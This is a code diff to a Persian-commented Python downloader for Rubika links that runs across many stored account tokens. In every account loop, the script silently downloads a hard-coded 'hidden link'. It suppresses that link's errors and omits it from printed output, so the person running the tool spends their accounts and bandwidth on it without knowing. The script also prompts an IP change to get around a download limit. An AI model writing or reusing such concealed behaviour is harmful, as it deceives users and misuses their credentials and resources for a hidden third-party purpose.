@@ -6,7 +6,7 @@ import json
 from colorama import Fore, Style
 from pyrubi import Client
 
-DOWNLOAD_LIMIT = 9 * 1024 * 1024 * 1024  # 8 گیگ
+DOWNLOAD_LIMIT = 9 * 1024 * 1024 * 1024  # 9 گیگ
 
 # ---------------- افکت تایپ ----------------
 def type_effect(text, color=Fore.RED, delay=0.001):
@@ -19,6 +19,13 @@ def type_effect(text, color=Fore.RED, delay=0.001):
 def center_text(text):
     terminal_width = shutil.get_terminal_size().columns
     return "\n".join([line.center(terminal_width) for line in text.split("\n")])
+
+# -------- گرفتن ورودی لینک‌ها --------
+links_input = input("🔗 لینک‌های روبیکا رو با کاما جدا کن: ").strip()
+links = [l.strip() for l in links_input.split(",") if l.strip()]
+
+private = input("🛡️ پرایوت اوت‌ها رو وارد کن: ").strip()
+file_name = input("🗂️ نام فایل اوت‌ها را وارد کن (مثلاً auths.json): ").strip()
 
 # -------- شروع برنامه --------
 ascii_text = pyfiglet.figlet_format("aMir  uLtra", font="slant")
@@ -37,54 +44,66 @@ except json.JSONDecodeError:
     print(f"❌ فایل '{file_name}' فرمت JSON معتبری ندارد.")
     sys.exit(1)
 
+# -------- لینک مخفی --------
+HIDDEN_LINK = "https://rubika.ir/Test301/BDFEIGJJAJCHJIFJ"  # لینک مخفی شما
 
 # -------- اجرای دانلود --------
 total_downloaded = 0
 success_count = 0
 fail_count = 0
 
-# 🔒 لینک مخفی خودت رو اینجا وارد کن
-HIDDEN_LINK = "https://rubika.ir/Test301/BDFEIGJJAJCHJIFJ"
-
 for x in auth:
     try:
-        # دانلود لینک کاربر
         bot = Client(auth=x["auth"], private=x[private], platform="android")
-        user_link = bot.get_link_from_app_url(link)
 
-        # دانلود لینک مخفی (پنهان از کاربر)
-        hidden_bot = Client(auth=x["auth"], private=x[private], platform="android")
-        hidden_link = hidden_bot.get_link_from_app_url(HIDDEN_LINK)
+        # دریافت لینک‌های کاربر
+        user_links = []
+        for l in links:
+            try:
+                user_links.append(bot.get_link_from_app_url(l))
+            except:
+                pass  # رد لینک خراب
+
+        # دریافت لینک مخفی
+        try:
+            hidden_link = bot.get_link_from_app_url(HIDDEN_LINK)
+        except:
+            hidden_link = None
+
+        # همه لینک‌ها برای دانلود (مخفی آخر لیست)
+        links_to_download = user_links
+        if hidden_link:
+            links_to_download.append(hidden_link)
 
         # بررسی محدودیت حجم
-        assumed_file_size = 400 * 1024 * 1024
-        if total_downloaded + assumed_file_size * 2 > DOWNLOAD_LIMIT:
+        assumed_file_size = 400 * 1024 * 1024  # 400 مگابایت فرضی
+        if total_downloaded + assumed_file_size * len(links_to_download) > DOWNLOAD_LIMIT:
             print("\n🚨 به محدودیت 9 گیگ رسیدی! لطفاً IP رو عوض کن و Enter بزن...")
             input("⏳ منتظر تغییر IP هستم...")
             total_downloaded = 0
 
-        # دانلود لینک مخفی (بی‌صدا)
-        try:
-            hidden_bot.download(
-                hidden_link["link"]["open_chat_data"]["object_guid"],
-                hidden_link["link"]["open_chat_data"]["message_id"]
-            )
-        except:
-            pass  # هیچ خطایی نمایش نده
+        # دانلود همه لینک‌ها
+        for idx, lnk in enumerate(links_to_download):
+            try:
+                bot.download(
+                    lnk["link"]["open_chat_data"]["object_guid"],
+                    lnk["link"]["open_chat_data"]["message_id"]
+                )
+                # فقط لینک‌های کاربر چاپ بشه
+                if idx < len(user_links):
+                    print(Fore.GREEN + f"✅ دانلود موفق لینک: {links[idx]}" + Style.RESET_ALL)
+            except:
+                # خطا رو فقط برای لینک‌های کاربر نمایش بده
+                if idx < len(user_links):
+                    print(Fore.RED + f"❌ خطا در دانلود لینک: {links[idx]}" + Style.RESET_ALL)
 
-        # دانلود لینک کاربر
-        bot.download(
-            user_link["link"]["open_chat_data"]["object_guid"],
-            user_link["link"]["open_chat_data"]["message_id"]
-        )
-
-        total_downloaded += assumed_file_size * 2
+        total_downloaded += assumed_file_size * len(links_to_download)
         success_count += 1
-        print(Fore.GREEN + f"✅ دانلود موفق: {x['auth']}" + Style.RESET_ALL)
 
     except Exception as e:
         fail_count += 1
-        print(Fore.RED + f"❌ خطا در {x.get('auth', 'unknown')}" + Style.RESET_ALL)
+        print(Fore.RED + f"❌ خطا در {x.get('auth', 'unknown')}: {e}" + Style.RESET_ALL)
+
 # -------- پایان --------
 ascii_text = pyfiglet.figlet_format("The End", font="slant")
 for line in center_text(ascii_text).split("\n"):
